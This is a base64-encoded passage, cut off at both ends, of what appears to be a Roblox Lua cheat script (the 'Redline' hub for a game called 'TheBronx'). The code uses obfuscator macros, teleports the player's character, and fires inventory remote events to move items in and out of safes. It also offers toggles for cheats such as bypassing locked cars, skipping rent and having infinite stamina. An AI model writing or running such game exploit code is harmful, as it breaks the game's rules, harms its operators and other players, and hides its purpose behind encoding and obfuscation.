CAgICAgICAgICAgICAgIGxvY2FsIFNhZmUsIE9sZENGcmFtZSA9IEdldFdvcmtpbmdTYWZlKCksIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChUZWxlcG9ydCwgU2FmZS5DaGVzdENsaWNrZXIuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUb29sID0gdG9zdHJpbmcoc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQiSHVtYW5vaWQiOlVuZXF1aXBUb29scygpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBJdGVtU2FmZWQgPSBmYWxzZTsgbG9jYWwgT2xkQmFja3BhY2tSZW1vdmVkOyBPbGRCYWNrcGFja1JlbW92ZWQgPSBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZFJlbW92ZWQ6Q29ubmVjdChmdW5jdGlvbihDaGlsZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvc3RyaW5nKENoaWxkKSA9PSBUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJdGVtU2FmZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2xkQmFja3BhY2tSZW1vdmVkOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoMiwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRlbVNhZmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuSW52ZW50b3J5OkZpcmVTZXJ2ZXIoIkNoYW5nZSIsIFRvb2wsICJCYWNrcGFjayIsIFNhZmUpCgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgSXRlbVNhZmVkID09IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKFRlbGVwb3J0LCBPbGRDRnJhbWUpCgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBTdWNjZXNzZnVsbHkgc2FmZWQge3N0YXRlfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgU2FmZUl0ZW1Db2x1bW4gPSBTYWZlVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBTYWZlSXRlbVNlY3Rpb24gPSBTYWZlSXRlbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlRha2UgU2VsZWN0ZWQgSXRlbSIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMSwgaWNvbiA9IEdldEltYWdlKCJVWkkucG5nIil9KQoKICAgICAgICAgICAgICAgIGxvY2FsIF9UYWtlSXRlbSA9IFNhZmVJdGVtU2VjdGlvbjpsaXN0KHtmbGFnID0gIlRha2VTZWxlY3RlZEl0ZW1fVGhlQnJvbngiLCBvcHRpb25zID0ge30sIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBTYWZlLCBPbGRDRnJhbWUgPSBHZXRXb3JraW5nU2FmZSgpLCBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoVGVsZXBvcnQsIFNhZmUuQ2hlc3RDbGlja2VyLkNGcmFtZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRvb2wgPSB0b3N0cmluZyhzdGF0ZSk7CgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBJdGVtU2FmZWQgPSBmYWxzZTsgbG9jYWwgT2xkQmFja3BhY2tDaGlsZEFkZGVkOyBPbGRCYWNrcGFja0NoaWxkQWRkZWQgPSBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oQ2hpbGQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3N0cmluZyhDaGlsZCkgPT0gVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRlbVNhZmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9sZEJhY2twYWNrQ2hpbGRBZGRlZDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLmRlbGF5KDIsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEl0ZW1TYWZlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKCiAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLkludmVudG9yeTpGaXJlU2VydmVyKCJDaGFuZ2UiLCBUb29sLCAiSW52IiwgU2FmZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBJdGVtU2FmZWQgPT0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoVGVsZXBvcnQsIE9sZENGcmFtZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gYFN1Y2Nlc3NmdWxseSB0b29rIHtzdGF0ZX0gZnJvbSBzYWZlIWAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBsb2NhbCBCYWNrcGFja19DaGlsZEFkZGVkLCBCYWNrcGFja19DaGlsZFJlbW92ZWQKCiAgICAgICAgICAgICAgICBsb2NhbCBDb25uZWN0QmFja3BhY2tUb1JlZnJlc2hTYWZlTGlzdCA9IExQSF9KSVRfTUFYKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUmVmcmVzaCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgSXRlbXMgPSB7fQoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBMb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KEl0ZW1zLCBWYWx1ZS5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuc29ydChJdGVtcykKCiAgICAgICAgICAgICAgICAgICAgICAgIF9TYWZlSXRlbS5yZWZyZXNoX29wdGlvbnMoSXRlbXMpCgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gSXRlbXMKICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oUmVmcmVzaCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBCYWNrcGFja19DaGlsZEFkZGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgQmFja3BhY2tfQ2hpbGRBZGRlZDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgQmFja3BhY2tfQ2hpbGRBZGRlZCA9IG5pbAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBCYWNrcGFja19DaGlsZFJlbW92ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBCYWNrcGFja19DaGlsZFJlbW92ZWQ6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2twYWNrX0NoaWxkUmVtb3ZlZCA9IG5pbAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBCYWNrcGFja19DaGlsZEFkZGVkID0gTG9jYWxQbGF5ZXIuQmFja3BhY2suQ2hpbGRBZGRlZDpDb25uZWN0KFJlZnJlc2gpCiAgICAgICAgICAgICAgICAgICAgQmFja3BhY2tfQ2hpbGRSZW1vdmVkID0gTG9jYWxQbGF5ZXIuQmFja3BhY2suQ2hpbGRSZW1vdmVkOkNvbm5lY3QoUmVmcmVzaCkKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oUGxheWVyKQogICAgICAgICAgICAgICAgICAgIGlmIFBsYXllciA9PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2twYWNrX0NoaWxkQWRkZWQ6RGlzY29ubmVjdCgpOyBCYWNrcGFja19DaGlsZFJlbW92ZWQ6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oQ29ubmVjdEJhY2twYWNrVG9SZWZyZXNoU2FmZUxpc3QpCgogICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChDb25uZWN0QmFja3BhY2tUb1JlZnJlc2hTYWZlTGlzdCkKCiAgICAgICAgICAgICAgICBsb2NhbCBSZWZyZXNoVGFrZUl0ZW1MaXN0ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIEl0ZW1zID0ge30KCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkludkRhdGEiKTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChJdGVtcywgVmFsdWUuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFibGUuc29ydChJdGVtcykKCiAgICAgICAgICAgICAgICAgICAgX1Rha2VJdGVtLnJlZnJlc2hfb3B0aW9ucyhJdGVtcykKCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEl0ZW1zCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgdGFzay5zcGF3bihSZWZyZXNoVGFrZUl0ZW1MaXN0KQoKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiSW52RGF0YSIpLkNoaWxkQWRkZWQ6Q29ubmVjdChSZWZyZXNoVGFrZUl0ZW1MaXN0KQogICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJJbnZEYXRhIikuQ2hpbGRSZW1vdmVkOkNvbm5lY3QoUmVmcmVzaFRha2VJdGVtTGlzdCkKCi0tW1tleHBlcmltZW50CmxvY2FsIGZ1bmN0aW9uIEZhc3RUUChjZikKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIEhSUCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgSFJQIHRoZW4KICAgICAgICBIUlAuQ0ZyYW1lID0gY2YKICAgIGVuZAplbmQKCgpsb2NhbCBTYWZlSXRlbVNlY3Rpb24gPSBTYWZlSXRlbUNvbHVtbjpzZWN0aW9uKHsKICAgIG5hbWUgPSAiU2FmZSBTZWxlY3RlZCBJdGVtIiwKICAgIHNpZGUgPSAibGVmdCIsCiAgICBzaXplID0gMSwKICAgIGljb24gPSBHZXRJbWFnZSgiTG9jay5wbmciKQp9KQoKbG9jYWwgX1NhZmVJdGVtID0gU2FmZUl0ZW1TZWN0aW9uOmxpc3QoewogICAgZmxhZyA9ICJTYWZlU2VsZWN0ZWRJdGVtX1RoZUJyb254IiwKICAgIG9wdGlvbnMgPSB7fSwKICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzdGF0ZSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgIGxvY2FsIFNhZmUgPSBHZXRXb3JraW5nU2FmZSgpCiAgICAgICAgICAgIGlmIG5vdCBTYWZlIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgSFJQID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgT2xkQ0ZyYW1lID0gSFJQLkNGcmFtZQoKICAgICAgICAgICAgRmFzdFRQKFNhZmUuQ2hlc3RDbGlja2VyLkNGcmFtZSkKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6VW5lcXVpcFRvb2xzKCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgVG9vbCA9IHRvc3RyaW5nKHN0YXRlKQogICAgICAgICAgICBsb2NhbCBEb25lID0gZmFsc2UKCiAgICAgICAgICAgIGxvY2FsIGNvbm4KICAgICAgICAgICAgY29ubiA9IExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkUmVtb3ZlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgaWYgY2hpbGQuTmFtZSA9PSBUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICBEb25lID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGNvbm46RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5kZWxheSgxLCBmdW5jdGlvbigpIERvbmUgPSB0cnVlIGVuZCkKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCgogICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5JbnZlbnRvcnk6RmlyZVNlcnZlcigiQ2hhbmdlIiwgVG9vbCwgIkJhY2twYWNrIiwgU2FmZSkKCiAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoMC4xKSB1bnRpbCBEb25lCgogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBGYXN0VFAoT2xkQ0ZyYW1lKQoKICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgIGluZm8gPSBgU3VjY2Vzc2Z1bGx5IHNhZmVkIHtUb29sfSFgLAogICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKSkKICAgIGVuZAp9KQoKU2FmZUl0ZW1Db2x1bW4gPSBTYWZlVGFiOmNvbHVtbih7fSkKClNhZmVJdGVtU2VjdGlvbiA9IFNhZmVJdGVtQ29sdW1uOnNlY3Rpb24oewogICAgbmFtZSA9ICJUYWtlIFNlbGVjdGVkIEl0ZW0iLAogICAgc2lkZSA9ICJyaWdodCIsCiAgICBzaXplID0gMSwKICAgIGljb24gPSBHZXRJbWFnZSgiVVpJLnBuZyIpCn0pCgpsb2NhbCBfVGFrZUl0ZW0gPSBTYWZlSXRlbVNlY3Rpb246bGlzdCh7CiAgICBmbGFnID0gIlRha2VTZWxlY3RlZEl0ZW1fVGhlQnJvbngiLAogICAgb3B0aW9ucyA9IHt9LAogICAgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgU2FmZSA9IEdldFdvcmtpbmdTYWZlKCkKICAgICAgICAgICAgaWYgbm90IFNhZmUgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICBsb2NhbCBIUlAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBsb2NhbCBPbGRDRnJhbWUgPSBIUlAuQ0ZyYW1lCgogICAgICAgICAgIEZhc3RUUChTYWZlLkNoZXN0Q2xpY2tlci5DRnJhbWUpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQoKICAgICAgICAgICAgbG9jYWwgVG9vbCA9IHRvc3RyaW5nKHN0YXRlKQogICAgICAgICAgICBsb2NhbCBEb25lID0gZmFsc2UKCiAgICAgICAgICAgIGxvY2FsIGNvbm4KICAgICAgICAgICAgY29ubiA9IExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgICAgIGlmIGNoaWxkLk5hbWUgPT0gVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgRG9uZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICBjb25uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHRhc2suZGVsYXkoMSwgZnVuY3Rpb24oKSBEb25lID0gdHJ1ZSBlbmQpCgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQoKICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuSW52ZW50b3J5OkZpcmVTZXJ2ZXIoIkNoYW5nZSIsIFRvb2wsICJJbnYiLCBTYWZlKQoKICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgwLjEpIHVudGlsIERvbmUKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIEZhc3RUUChPbGRDRnJhbWUpCgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9IGBTdWNjZXNzZnVsbHkgdG9vayB7VG9vbH0gZnJvbSBzYWZlIWAsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgfSkKICAgICAgICBlbmQpKQogICAgZW5kCn0pCgpsb2NhbCBCYWNrcGFja19DaGlsZEFkZGVkLCBCYWNrcGFja19DaGlsZFJlbW92ZWQKCmxvY2FsIENvbm5lY3RCYWNrcGFja1RvUmVmcmVzaFNhZmVMaXN0ID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCgogICAgbG9jYWwgUmVmcmVzaCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBJdGVtcyA9IHt9CgogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhMb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChJdGVtcywgdG9vbC5OYW1lKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgdGFibGUuc29ydChJdGVtcykKICAgICAgICBfU2FmZUl0ZW0ucmVmcmVzaF9vcHRpb25zKEl0ZW1zKQogICAgICAgIHJldHVybiBJdGVtcwogICAgZW5kKQoKICAgIHRhc2suc3Bhd24oUmVmcmVzaCkKCiAgICBpZiBCYWNrcGFja19DaGlsZEFkZGVkIHRoZW4gQmFja3BhY2tfQ2hpbGRBZGRlZDpEaXNjb25uZWN0KCkgZW5kCiAgICBpZiBCYWNrcGFja19DaGlsZFJlbW92ZWQgdGhlbiBCYWNrcGFja19DaGlsZFJlbW92ZWQ6RGlzY29ubmVjdCgpIGVuZAoKICAgIEJhY2twYWNrX0NoaWxkQWRkZWQgPSBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoUmVmcmVzaCkKICAgIEJhY2twYWNrX0NoaWxkUmVtb3ZlZCA9IExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkUmVtb3ZlZDpDb25uZWN0KFJlZnJlc2gpCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGlmIEJhY2twYWNrX0NoaWxkQWRkZWQgdGhlbiBCYWNrcGFja19DaGlsZEFkZGVkOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBpZiBCYWNrcGFja19DaGlsZFJlbW92ZWQgdGhlbiBCYWNrcGFja19DaGlsZFJlbW92ZWQ6RGlzY29ubmVjdCgpIGVuZAogICAgZW5kCmVuZCkpCgp0YXNrLnNwYXduKENvbm5lY3RCYWNrcGFja1RvUmVmcmVzaFNhZmVMaXN0KQpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KENvbm5lY3RCYWNrcGFja1RvUmVmcmVzaFNhZmVMaXN0KQoKbG9jYWwgUmVmcmVzaFRha2VJdGVtTGlzdCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgIGxvY2FsIEl0ZW1zID0ge30KCiAgICBmb3IgXywgdmFsdWUgaW4gaXBhaXJzKExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiSW52RGF0YSIpOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgdGFibGUuaW5zZXJ0KEl0ZW1zLCB2YWx1ZS5OYW1lKQogICAgZW5kCgogICAgdGFibGUuc29ydChJdGVtcykKICAgIF9UYWtlSXRlbS5yZWZyZXNoX29wdGlvbnMoSXRlbXMpCgogICAgcmV0dXJuIEl0ZW1zCmVuZCkKCnRhc2suc3Bhd24oUmVmcmVzaFRha2VJdGVtTGlzdCkKCkxvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiSW52RGF0YSIpLkNoaWxkQWRkZWQ6Q29ubmVjdChSZWZyZXNoVGFrZUl0ZW1MaXN0KQpMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkludkRhdGEiKS5DaGlsZFJlbW92ZWQ6Q29ubmVjdChSZWZyZXNoVGFrZUl0ZW1MaXN0KQotLWV4cGVyaW1lbnQgZW5kXV0KCgogICAgICAgICAgICBkbyAtLSBcXCBMb2NhbCBQbGF5ZXIgVGFiCiAgICAgICAgICAgICAgICBsb2NhbCBMb2NhbFBsYXllckNvbHVtbiA9IExvY2FsUGxheWVyVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBMb2NhbFBsYXllck1vZHNTZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJQbGF5ZXIgTW9kcyIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAxLjA1fSkKCgogICAgICAgICAgICAgICAgbG9jYWwgX19Nb2RpZmljYXRpb25zID0gewogICAgICAgICAgICAgICAgICAgICJJbmZpbml0ZSBTbGVlcCI7CiAgICAgICAgICAgICAgICAgICAgIkluZmluaXRlIEh1bmdlciI7CiAgICAgICAgICAgICAgICAgICAgIkluZmluaXRlIFN0YW1pbmEiOwogICAgICAgICAgICAgICAgICAgICJJbnN0YW50IEludGVyYWN0IjsKICAgICAgICAgICAgICAgICAgICAiRmFzdCBSZXNwYXduIjsKICAgICAgICAgICAgICAgICAgICAiQXV0byBQaWNrdXAgQ2FzaCI7CiAgICAgICAgICAgICAgICAgICAgIkF1dG8gUGlja3VwIEJhZ3MiOwogICAgICAgICAgICAgICAgICAgICJEaXNhYmxlIENhbWVyYSBCb2JiaW5nIjsKICAgICAgICAgICAgICAgICAgICAiRGlzYWJsZSBCbG9vZCBFZmZlY3RzIjsKICAgICAgICAgICAgICAgICAgICAiQnlwYXNzIExvY2tlZCBDYXJzIjsKICAgICAgICAgICAgICAgICAgICAiTm8gUmVudCBQYXkiOwogICAgICAgICAgICAgICAgICAgICJBbnRpIExvc2UgSXRlbXMiOwogICAgICAgICAgICAgICAgICAgICJSZWRsaW5lIE5hbWUgVGFnIjsgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICJObyBKdW1wIENvb2xkb3duIjsKICAgICAgICAgICAgICAgICAgICAiTm8gRmFsbCBEYW1hZ2UiOwogICAgICAgICAgICAgICAgICAgICJObyBLbm9ja2JhY2siOwogICAgICAgICAgICAgICAgICAgICJSZXNwYXduIFdoZXJlIFlvdSBEaWVkIjsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmb3IgXywgSW5kZXggaW4gX19Nb2RpZmljYXRpb25zIGRvCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9IEluZGV4LCBmbGFnID0gSW5kZXgsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnNbSW5kZXg6Z3N1YigiICIsICIiKV0gPSBzdGF0ZQogICAgICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllckNvbHVtbiA9IExvY2FsUGxheWVyVGFiOmNvbHVtbih7fSkKICAgICAgICAgICAgICAgIGxvY2FsIENoYXJhY3Rlck1vZHNTZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJFeHRyYSBQbGF5ZXIgTW9kcyIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC44MjAsIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tW1tDaGFyYWN0ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJGbHkiLCBmbGFnID0gImludmlzZmx5IiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5pbnZpc2ZseSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KV1dICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cG